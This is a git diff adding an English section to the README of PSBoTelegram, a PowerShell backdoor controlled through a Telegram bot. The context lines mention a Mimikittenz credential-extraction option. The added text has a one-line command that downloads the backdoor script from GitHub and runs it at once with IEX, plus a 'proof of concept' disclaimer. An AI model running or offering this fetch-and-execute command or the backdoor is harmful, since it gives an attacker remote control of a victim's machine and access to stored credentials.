@@ -68,3 +68,24 @@ Una vez introducido estos datos, nos creará un shellcode en BASE64 en un tipo d
 [16]&nbsp;&nbsp;**/Mimikittenz**&nbsp;&nbsp; (Ejecuta Mimikittenz, comprobando si el equipo es vulnerable y si no lo es, lo hace vulnerable... )  
 
 
+# PsBoTelegram English 
+Backdoor using Telegram and Powershell. Please use only your test equipment.
+I am not responsible for any misuse of the software. Make sure this is only a proof of concept. 
+
+You can test the script by opening a powershell console and running this command:
+
+**IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
+
+
+        ____  _____ ____      ______     __
+       / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
+      / /_/ /\__ \/ __  / __ \/ / / _ \/ / _ \/ __  / ___/ __  / __  __ \
+     / ____/___/ / /_/ / /_/ / / /  __/ /  __/ /_/ / /  / /_/ / / / / / /
+    /_/    /____/_____/\____/_/  \___/_/\___/\__, /_/   \__,_/_/ /_/ /_/
+                                            /____/
+
+                                                     v0.8 by CyberVaca @ HackPlayers
+
+PSBotTelegram is a script written in Powershell, which creates a backdoor that connects to a Telegram BOT. The BOT will be controlled by Telegram messages. When executing the script we will ask for three data needed to create the shellcode.
+
+
